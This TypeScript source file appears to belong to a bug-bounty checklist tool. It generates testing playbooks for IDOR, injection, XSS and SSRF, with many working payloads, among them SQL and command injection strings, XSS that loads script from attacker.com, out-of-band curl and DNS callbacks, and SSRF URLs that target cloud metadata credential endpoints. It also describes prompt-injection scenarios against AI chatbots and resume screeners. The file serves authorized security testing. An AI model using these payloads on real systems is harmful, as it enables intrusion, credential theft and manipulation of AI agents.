import type {
  ChecklistCategory,
  ChecklistDomain,
  ChecklistItem,
  TestingMethod,
  UseCaseScenario,
} from "../types/checklist";

/**
 * Provides comprehensive, multi-method testing playbooks and real-world bug bounty use cases
 * for any checklist item. If the item defines its own custom methods/useCases, those take precedence.
 * Otherwise, domain- and category-aware methodologies are generated.
 */
export function getItemPlaybook(
  item: ChecklistItem,
  category: ChecklistCategory,
  _domain: ChecklistDomain
): {
  methods: TestingMethod[];
  useCases: UseCaseScenario[];
} {
  const existingMethods = item.methods && item.methods.length > 0 ? item.methods : null;
  const existingUseCases = item.useCases && item.useCases.length > 0 ? item.useCases : null;

  const catId = category.id.toLowerCase();

  // Generate category-tailored methods if not explicitly set
  const methods: TestingMethod[] =
    existingMethods || generateMethodsForCategory(item, catId);

  // Generate category-tailored real-world use cases if not explicitly set
  const useCases: UseCaseScenario[] =
    existingUseCases || generateUseCasesForCategory(catId);

  return { methods, useCases };
}

function generateMethodsForCategory(
  item: ChecklistItem,
  catId: string
): TestingMethod[] {
  const basePayload = item.payloads?.[0] || "";

  // 1. IDOR / Access Control / Authorization
  if (catId.includes("idor") || catId.includes("access") || catId.includes("bopla") || catId.includes("privesc")) {
    return [
      {
        title: "Method 1: Two-Account Browser Proxy Interception",
        scenario: "Classic cross-tenant IDOR where User A modifies or accesses User B's resource.",
        tools: ["Burp Suite / Caido", "Two Separate Browser Profiles (Containers)"],
        steps: [
          "Log into User A (Attacker) in Browser Window 1 and User B (Victim) in Browser Window 2 (or Firefox Multi-Account Containers).",
          "Perform the target action (view invoice, edit profile, delete project) with User B and capture the raw HTTP request in Burp Suite.",
          "Identify all object reference parameters: numeric IDs (e.g. id=1054), UUIDs (uuid=3f8c...), usernames, or email addresses.",
          "Send the captured request to Burp Repeater. Replace User B's session cookie / Authorization Bearer token with User A's token.",
          "Send the request and verify if the server returns 200 OK with User B's private data or modifies User B's record.",
        ],
        payloads: [
          "GET /api/v1/users/USER_B_ID HTTP/1.1\nAuthorization: Bearer <USER_A_TOKEN>",
          "POST /api/v1/projects/delete\n{\"project_id\": \"VICTIM_PROJECT_UUID\"}",
        ],
        tips: "Always check if the object identifier appears in query params, request body JSON, or custom headers (e.g. X-Tenant-Id, X-User-Id).",
      },
      {
        title: "Method 2: HTTP Verb / Method Substitution & Path Traversal",
        scenario: "When direct GET or POST is blocked by an API gateway or authorization filter.",
        tools: ["Burp Repeater", "cURL"],
        steps: [
          "If GET /api/documents/1054 returns 403 Forbidden, change the HTTP verb to POST, PUT, PATCH, or HEAD.",
          "Test HTTP method overriding headers: add 'X-HTTP-Method-Override: GET' or '_method=GET'.",
          "Attempt path parameter traversal: request '/api/documents/me/..;/1054' or '/api/documents/%2e%2e/1054'.",
          "Check for alternative API version routes (e.g. changing /v2/ to /v1/ or /internal/).",
        ],
        payloads: [
          "POST /api/documents/1054 HTTP/1.1\nX-HTTP-Method-Override: GET",
          "GET /api/users/me/../victim_user_id HTTP/1.1",
        ],
        tips: "Many microservice architectures enforce RBAC only on specific HTTP verbs, leaving PUT or DELETE unprotected.",
      },
      {
        title: "Method 3: JSON Array & Type Confusion Injection",
        scenario: "Bypassing object validation filters via type juggling.",
        tools: ["Burp Repeater", "Postman / Bruno"],
        steps: [
          "If the API accepts JSON `{\"user_id\": 1054}`, change the integer to a string: `{\"user_id\": \"1054\"}`.",
          "Wrap the target ID inside an array: `{\"user_id\": [1054]}` or nested object: `{\"user_id\": {\"id\": 1054}}`.",
          "Check if backend database query framework (MongoDB, Sequelize, Prisma) performs loose type evaluation.",
        ],
        payloads: [
          "{\"account_id\": [1054]}",
          "{\"account_id\": {\"$gt\": 0}}",
        ],
        tips: "NoSQL databases frequently treat JSON objects as query operators if types are not strictly validated.",
      },
      {
        title: "Method 4: Automated Bulk Enumeration via Burp Intruder / ffuf",
        scenario: "Testing predictable sequential IDs for systemic data exposure.",
        tools: ["Burp Intruder / Caido Automate", "ffuf"],
        steps: [
          "Capture a valid request containing an ID parameter (e.g. invoice_id=2000).",
          "Send to Intruder or ffuf. Set the ID parameter as the payload marker: `invoice_id=§2000§`.",
          "Configure Numbers payload type (e.g. 1950 to 2050, step 1).",
          "Analyze responses for consistent HTTP 200 responses with differing Content-Lengths, indicating access to other accounts' invoices.",
        ],
        payloads: [
          "ffuf -u 'https://example.com/api/invoices/FUZZ' -H 'Authorization: Bearer <TOKEN>' -w numbers.txt -mc 200",
        ],
        tips: "Filter out false positives by matching response status 200 and excluding responses matching your own account's content length.",
      },
    ];
  }

  // 2. Injection (SQLi, NoSQLi, Command, SSTI)
  if (catId.includes("inject") || catId.includes("sqli") || catId.includes("cmd") || catId.includes("ssti") || catId.includes("xxe")) {
    return [
      {
        title: "Method 1: Manual Context Breaking & Syntax Error Triggering",
        scenario: "Detecting backend parser errors and unescaped input reflections.",
        tools: ["Burp Suite Repeater", "Browser DevTools"],
        steps: [
          "Locate all parameters reflected in backend queries, commands, or database lookups.",
          "Inject individual context-breaking characters: single quote ('), double quote (\"), backtick (`), semicolon (;), pipe (|), and closing tags.",
          "Observe HTTP response status, error banners (e.g. ORA-, syntax error, uncaught exception), or differences in response body length.",
          "Test basic arithmetic tautology payloads to verify Boolean logic (e.g. ' OR 1=1 vs ' OR 1=2).",
        ],
        payloads: [
          basePayload || "' OR 1=1 --",
          "test' OR '1'='1",
          "`whoami` || ping -c 3 127.0.0.1",
        ],
        tips: "Always test both URL query parameters and JSON body keys, including numeric fields.",
      },
      {
        title: "Method 2: Time-Based Blind Differential Probing",
        scenario: "When the application suppresses database errors and produces identical response bodies.",
        tools: ["Burp Repeater", "cURL with time measurement"],
        steps: [
          "Inject time-delay payloads specific to the suspected engine (sleep(5), pg_sleep(5), WAITFOR DELAY '0:0:5').",
          "Observe response timing: a delay matching your injected duration confirms code execution in the backend engine.",
          "Repeat with sleep(0) or false conditionals to verify the delay was caused by your payload, not network latency.",
        ],
        payloads: [
          "'; WAITFOR DELAY '0:0:5'--",
          "\" AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
          "{{range .}}{{.sleep(5000)}}{{end}}",
        ],
        tips: "Ensure network jitter is accounted for; run 3 trials with sleep(5) and 3 trials with sleep(0) to confirm consistency.",
      },
      {
        title: "Method 3: Out-of-Band (OOB / Blind AST) Interaction",
        scenario: "Triggering external DNS/HTTP lookups from backends isolated behind firewalls.",
        tools: ["Burp Collaborator", "ProjectDiscovery interactsh-client"],
        steps: [
          "Generate a unique Collaborator/Interactsh hostname (e.g. `xyz.oast.pro`).",
          "Inject payloads instructing the backend to perform a DNS lookup or HTTP request to your listener.",
          "Monitor Collaborator polls for incoming DNS or HTTP connections containing query substrings.",
        ],
        payloads: [
          "'; EXEC master..xp_dirtree '//xyz.oast.pro/a'--",
          "; curl http://xyz.oast.pro #",
          "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://xyz.oast.pro/x\"> %remote;]>",
        ],
        tips: "DNS queries frequently bypass egress firewalls that block outbound HTTP/HTTPS connections.",
      },
      {
        title: "Method 4: Automated Tool Verification (sqlmap / commix / tplmap)",
        scenario: "Verifying and escalating confirmed injection points safely.",
        tools: ["sqlmap", "commix"],
        steps: [
          "Save the raw HTTP request from Burp into a text file `req.txt`.",
          "Run sqlmap or commix with non-destructive flags: `sqlmap -r req.txt --batch --dbs`.",
          "Verify the injectable parameter and note the backend DBMS version and current user privileges.",
        ],
        payloads: [
          "sqlmap -r req.txt -p target_param --current-user --current-db --batch",
        ],
        tips: "Never run destructive commands or write web shells unless explicitly authorized by the program's rules of engagement.",
      },
    ];
  }

  // 3. XSS (Cross-Site Scripting)
  if (catId.includes("xss")) {
    return [
      {
        title: "Method 1: Context-Specific Manual Polyglot Testing",
        scenario: "Identifying exact reflection context (HTML body, attribute, script tag, or template literal).",
        tools: ["Browser DevTools (Elements Inspector)", "Burp Suite Repeater"],
        steps: [
          "Inject a benign unique canary string: `xsscheck1234`.",
          "Inspect page source to identify where `xsscheck1234` lands: between HTML tags, inside an `<input value=\"...\">` attribute, or inside a `<script>` tag.",
          "Craft the escape string matching that specific syntax context (e.g. `\"><script>` for attributes, `</script><script>` for script blocks).",
          "Inject modern executable proof of concept: `<svg onload=alert(document.domain)>` or `<img src=x onerror=alert(1)>`.",
        ],
        payloads: [
          "\"><svg/onload=alert(document.domain)>",
          "'-alert(document.domain)-'",
          "${alert(document.domain)}",
        ],
        tips: "Look closely at Content-Type: if response is application/json or text/plain, browser won't execute scripts unless rendered via DOM sink.",
      },
      {
        title: "Method 2: DOM-Based Sink & Source Tracing",
        scenario: "Exploiting client-side JavaScript that writes untrusted sources into dangerous sinks.",
        tools: ["Browser Console", "DOM Invader (Burp Suite Embedded Browser)"],
        steps: [
          "Open DevTools Console on the target page.",
          "Search client-side JS for sources: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`.",
          "Trace if values reach sinks: `element.innerHTML`, `document.write`, `eval()`, `setTimeout()`, `location.href`.",
          "Craft a URL fragment or query parameter payload that feeds malicious HTML directly into the sink without hitting the server.",
        ],
        payloads: [
          "https://example.com/page#<img src=x onerror=alert(document.domain)>",
          "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'>",
        ],
        tips: "Enable DOM Invader in Burp's browser to automatically flag sinks that receive controllable inputs.",
      },
      {
        title: "Method 3: WAF Bypass & Filter Mutation",
        scenario: "Evading Cloudflare, AWS WAF, or Akamai string pattern filters.",
        tools: ["Hacker Tools WAF Mutator", "Burp Intruder"],
        steps: [
          "Test which specific characters or keywords trigger the WAF (e.g. `<script>`, `alert`, `onerror`, `onload`).",
          "Substitute prohibited tags with uncommonly filtered tags: `<details/ontoggle=alert(1)>`, `<audio/src/onerror=alert(1)>`.",
          "Use alternative execution vectors: `print()`, `confirm()`, `prompt()`, or top-level navigation: `location='//attacker.com'`.",
        ],
        payloads: [
          "<details open ontoggle=alert(1)>",
          "<svg/onload=import('//attacker.com/xss.js')>",
          "<a href=\"jav&#x09;ascript:alert(1)\">click</a>",
        ],
        tips: "HTML entities are decoded automatically by the browser inside tag attributes (like href or src), allowing complete keyword obfuscation.",
      },
    ];
  }

  // 4. SSRF (Server-Side Request Forgery)
  if (catId.includes("ssrf") || catId.includes("cloud-metadata")) {
    return [
      {
        title: "Method 1: Cloud Metadata Probing (AWS / GCP / Azure)",
        scenario: "Exfiltrating IAM credentials or cloud instance tokens via server fetchers.",
        tools: ["Burp Suite Repeater", "cURL"],
        steps: [
          "Identify features that take URLs as input: webhook creators, avatar upload from URL, PDF export, URL previews.",
          "Supply the internal metadata endpoint: `http://169.254.169.254/latest/meta-data/` (AWS) or `http://metadata.google.internal/` (GCP).",
          "Test IP format obfuscations: decimal (2852039166), hex (0xa9fea9fe), IPv6 mapped (::ffff:169.254.169.254).",
          "Inspect server response or generated document for cloud credentials.",
        ],
        payloads: [
          "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
          "http://[::ffff:169.254.169.254]/latest/meta-data/",
          "http://2852039166/latest/meta-data/",
        ],
        tips: "If IMDSv2 is enforced on AWS, test if you can issue PUT requests with token headers or look for GCP/Kubernetes endpoints instead.",
      },
      {
        title: "Method 2: DNS Rebinding & TOCTOU (Time-of-Check to Time-of-Use)",
        scenario: "Bypassing IP address validation checks when server resolves DNS twice.",
        tools: ["rbndr.us", "1u.ms (DNS rebinding service)"],
        steps: [
          "Use a public DNS rebinding service to generate a hostname configured with A record 1.1.1.1 and A record 127.0.0.1 with TTL=0.",
          "Submit the hostname to the target URL preview / fetcher endpoint.",
          "When the backend resolves DNS to validate the IP, it gets 1.1.1.1 (Allowed). When it fetches the content 5ms later, DNS resolves to 127.0.0.1 (Internal target reached).",
        ],
        payloads: [
          "http://7f000001.01010101.rbndr.us/",
          "http://make-1.1.1.1-rebind-127.0.0.1-rr.1u.ms/",
        ],
        tips: "DNS rebinding is exceptionally effective against custom Python/Node URL validator libraries that don't pin the socket IP address.",
      },
      {
        title: "Method 3: Alternative Protocol & URL Parser Abuse",
        scenario: "Escaping HTTP restrictions using other schemas or parser discrepancies.",
        tools: ["Burp Suite", "Gopherus"],
        steps: [
          "Test non-HTTP URL schemes: `file:///etc/passwd`, `dict://127.0.0.1:6379/info`, `gopher://`.",
          "Exploit URL parser discrepancies using user-info `@` or fragment `#`: `http://allowed.target.com@169.254.169.254/`.",
          "Test redirection chaining: point the target to your external server that returns an HTTP 302 redirecting to `http://127.0.0.1:8080/admin`.",
        ],
        payloads: [
          "file:///etc/passwd",
          "http://google.com#@169.254.169.254/latest/meta-data/",
          "http://attacker.com/302.php?url=http://169.254.169.254",
        ],
        tips: "Many backend HTTP client libraries (like Java HttpURLConnection, Python requests, cURL) follow redirects by default unless explicitly disabled.",
      },
    ];
  }

  // 5. Default Comprehensive Playbook for all other categories (Recon, Auth, Mobile, Cloud, Logic, API)
  return [
    {
      title: "Method 1: Manual Step-by-Step Interception & Parameter Manipulation",
      scenario: "Primary manual verification using an intercepting HTTP proxy.",
      tools: ["Burp Suite / Caido", "Browser Developer Tools"],
      steps: [
        "Enable proxy interception and trigger the target action in the application.",
        "Locate the primary HTTP request in HTTP History and send to Repeater.",
        `Follow specific test guidance: ${item.how}`,
        basePayload ? `Inject test payload: ${basePayload}` : "Manipulate request fields, headers, and parameters.",
        item.expectedResponse
          ? `Verify response against indicator: Vulnerable if "${item.expectedResponse.vulnerable}".`
          : "Analyze response code, headers, and body for discrepancies.",
      ],
      payloads: item.payloads && item.payloads.length > 0 ? item.payloads.slice(0, 3) : undefined,
      tips: "Always capture baseline legitimate responses first so you can clearly diff behavior when manipulating inputs.",
    },
    {
      title: "Method 2: CLI & Scripted Command-Line Reproduction",
      scenario: "Reproducing findings cleanly for Bug Bounty Proof-of-Concept submissions.",
      tools: ["cURL", "HTTPie", "Terminal / Bash"],
      steps: [
        "Right-click the request in Burp Suite and select 'Copy as cURL'.",
        "Paste into terminal and test variations rapidly using flags (-i for headers, -s for silent).",
        "Automate parameter iterations using bash loops or small Python scripts.",
        "Document exact terminal output to attach to your bug report.",
      ],
      payloads: basePayload ? [`curl -i -X POST https://example.com/target -d "${basePayload}"`] : undefined,
      tips: "Triage teams on HackerOne and Bugcrowd love clean cURL commands because they can reproduce in seconds without setting up Burp.",
    },
    {
      title: "Method 3: Boundary Testing, Edge-Cases & Header Variations",
      scenario: "Testing non-standard inputs, header overrides, and bypass techniques.",
      tools: ["Burp Repeater", "Postman / Bruno"],
      steps: [
        "Test with boundary values: null bytes (%00), large strings (buffer limits), empty values, negative numbers.",
        "Inject custom headers: 'X-Forwarded-For: 127.0.0.1', 'X-Original-URL: /admin', 'X-Custom-IP-Authorization: 127.0.0.1'.",
        "Change Content-Type header (e.g. from application/json to application/x-www-form-urlencoded or text/plain).",
      ],
      payloads: [
        "X-Forwarded-For: 127.0.0.1\nX-Forwarded-Host: localhost",
        "Content-Type: application/x-www-form-urlencoded",
      ],
      tips: "WAFs and API gateways often apply inspection rules only to expected Content-Types, ignoring unconventional ones.",
    },
    {
      title: "Method 4: Multi-Role Authorization & Session State Testing",
      scenario: "Testing permission boundaries and access controls across user roles.",
      tools: ["Burp Suite Session Handling Rules / Autorize Extension"],
      steps: [
        "Test the endpoint with: (1) High-privilege role, (2) Low-privilege role, (3) Unauthenticated anonymous request.",
        "Check if removing authorization headers (Cookie, Authorization) returns the same data.",
        "Test if an expired or invalid token is rejected or silently accepted.",
      ],
      tips: "Use Burp extension 'Autorize' to test authorization across all browsed endpoints in the background automatically.",
    },
  ];
}

function generateUseCasesForCategory(
  catId: string
): UseCaseScenario[] {
  // Return realistic real-world attack scenarios based on category
  if (catId.includes("idor") || catId.includes("access") || catId.includes("bopla")) {
    return [
      {
        title: "Scenario 1: Multi-Tenant Team & Workspace Boundaries",
        targetContext: "Enterprise workspace invite flows, member role assignment, and project dashboards.",
        description:
          "Target application allows organizations to invite members. Attacker tampers with organization_id or workspace_uuid to access other corporate tenants' dashboards.",
        impactExample: "Massive confidential data disclosure across corporate customer boundaries.",
      },
      {
        title: "Scenario 2: Financial Invoices, Receipts & Payment Profiles",
        targetContext: "Billing portals, Stripe customer IDs, downloadable PDF receipts, refund requests.",
        description:
          "Sequential or predictable invoice numbers (e.g. /invoices/INV-2024-0012) lack ownership verification, allowing downloading all customer invoices.",
        impactExample: "PII leakage, payment history exposure, and customer list harvesting.",
      },
      {
        title: "Scenario 3: Private Document & File Attachments",
        targetContext: "Customer support tickets, KYC identity verification uploads, resume portals.",
        description:
          "Attacker alters attachment_id or document_token to view confidential identity documents or sensitive uploaded files.",
        impactExample: "Direct regulatory violation (GDPR / HIPAA / PCI-DSS).",
      },
    ];
  }

  if (catId.includes("ssrf") || catId.includes("cloud")) {
    return [
      {
        title: "Scenario 1: Automated PDF / Report Exporter from URL",
        targetContext: "HTML-to-PDF converters (wkhtmltopdf, Puppeteer, Headless Chrome).",
        description:
          "User inputs an external webpage URL to generate a PDF summary. Attacker inputs internal metadata URL or local file scheme to extract credentials in the rendered PDF.",
        impactExample: "Full AWS/GCP cloud account takeover via stolen instance role credentials.",
      },
      {
        title: "Scenario 2: Webhook Endpoint Verification & Integration Callbacks",
        targetContext: "Payment gateways, Slack/Discord bots, custom third-party integrations.",
        description:
          "Application pings user-supplied webhook URLs to verify connectivity. Attacker inputs internal loopback or cloud metadata IPs to probe internal private subnets.",
        impactExample: "Port scanning of private VPC network and pivoting into unauthenticated internal microservices.",
      },
      {
        title: "Scenario 3: Social Media & Link Preview Generators (OpenGraph)",
        targetContext: "Chat applications, comment preview cards, rich link unpackers.",
        description:
          "Pasting a URL causes server to fetch og:image metadata. Attacker uses DNS rebinding to target internal Redis, Elasticsearch, or database ports.",
        impactExample: "Internal unauthenticated database query execution via HTTP protocol smuggling.",
      },
    ];
  }

  if (catId.includes("ai") || catId.includes("prompt")) {
    return [
      {
        title: "Scenario 1: Customer Support Chatbot with Internal Tool Calling",
        targetContext: "AI customer agents with database search, order status, or refund capabilities.",
        description:
          "Attacker uses prompt injection to coerce the chatbot into invoking administrative refund or password reset functions without human authorization.",
        impactExample: "Unauthorized financial transactions or customer account takeover via AI agent deputy.",
      },
      {
        title: "Scenario 2: Automated Resume / Document Screening System",
        targetContext: "HR applicant tracking systems, PDF summarizers, ticket triage bots.",
        description:
          "Attacker embeds indirect prompt injection in white text or comments inside a resume to bias the model into scoring candidate 100/100 and leaking other applicants' resumes.",
        impactExample: "Data exfiltration of internal recruitment database and bypass of screening filters.",
      },
    ];
  }

  // Default scenarios
  return [
    {
      title: "Scenario 1: Onboarding, Registration & User Profile Settings",
      targetContext: "Account creation, username changes, email verification, password reset flows.",
      description:
        "Where users submit high-value information. Parameter manipulation, injection, and logic flaws here often lead to immediate account takeover.",
      impactExample: "Account takeover or persistent authentication bypass across the platform.",
    },
    {
      title: "Scenario 2: Undocumented & Legacy API Endpoints (/v1, /beta, /staging)",
      targetContext: "Mobile application backends, forgotten legacy endpoints, staging microservices.",
      description:
        "Old endpoints that developers forgot to deprecate often lack security filters, rate limiters, or authorization checks implemented on modern routes.",
      impactExample: "Bypass of production security controls by routing traffic through legacy endpoints.",
    },
    {
      title: "Scenario 3: Bulk Export, Search & Reporting Modules",
      targetContext: "CSV exports, search bars with autocomplete, table pagination, filter queries.",
      description:
        "Complex database query construction often exposes SQLi, NoSQLi, Resource Exhaustion DoS, or excessive data exposure.",
      impactExample: "Mass database exfiltration or server memory exhaustion.",
    },
  ];
}
